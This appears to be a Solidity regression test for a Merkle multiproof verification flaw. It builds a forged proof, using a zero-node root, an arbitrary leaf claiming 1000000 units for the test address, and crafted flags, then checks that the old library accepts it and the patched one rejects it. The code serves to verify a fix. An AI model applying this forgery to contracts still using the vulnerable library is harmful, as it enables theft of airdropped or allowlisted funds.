// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {MerkleProof as OldProof} from "old/utils/cryptography/MerkleProof.sol";
import {MerkleProof as FixedProof} from "oz/utils/cryptography/MerkleProof.sol";
contract Checker {
 function oldCheck(bytes32[] memory p,bool[] memory f,bytes32 root,bytes32[] memory l) external pure returns(bool) {return OldProof.multiProofVerify(p,f,root,l);}
 function fixedCheck(bytes32[] memory p,bool[] memory f,bytes32 root,bytes32[] memory l) external pure returns(bool) {return FixedProof.multiProofVerify(p,f,root,l);}
}
contract Proof {
 function testArbitraryHashedLeafPassesZeroNodeRoot() public {
  Checker c=new Checker(); bytes32 branch=keccak256("legitimate branch");
  bytes32 root=keccak256(abi.encode(bytes32(0),branch));
  bytes32[] memory leaves=new bytes32[](1); leaves[0]=keccak256(abi.encode(address(this),1000000));
  bytes32[] memory proof=new bytes32[](2);proof[0]=branch;proof[1]=bytes32(uint256(123));
  bool[] memory flags=new bool[](2);flags[0]=true;flags[1]=false;
  require(c.oldCheck(proof,flags,root,leaves),"forgery rejected");
  (bool ok,)=address(c).call(abi.encodeCall(c.fixedCheck,(proof,flags,root,leaves)));
  require(!ok,"patch accepted forgery");
 }
}

